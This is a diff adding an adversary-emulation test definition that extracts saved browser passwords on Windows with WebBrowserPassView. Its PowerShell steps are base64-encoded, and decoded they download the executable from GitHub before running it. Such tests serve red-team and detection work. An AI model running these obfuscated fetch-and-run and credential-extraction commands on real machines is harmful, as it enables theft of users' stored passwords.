@@ -1,0 +1,21 @@
+- id: 6b605049-1380-5fdc-91da-7e246eec730f
+  name: Soumaia ART Tests - WebBrowserPassView - Credentials from Browser
+  description: The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware. (requires elevation)
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFcAZQBiAEIAcgBvAHcAcwBlAHIAUABhAHMAcwBWAGkAZQB3AC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABiAGkAbgAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADUANQAuADAAMAAzAC8AYgBpAG4ALwBXAGUAYgBCAHIAbwB3AHMAZQByAFAAYQBzAHMAVgBpAGUAdwAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVwBlAGIAQgByAG8AdwBzAGUAcgBQAGEAcwBzAFYAaQBlAHcALgBlAHgAZQAiAAoA
+          }
+          Start-Process ".\WebBrowserPassView.exe"
+          Start-Sleep -Second 4
+          Stop-Process -Name "WebBrowserPassView"
+        payloads:
+        - WebBrowserPassView.exe
+        - bin
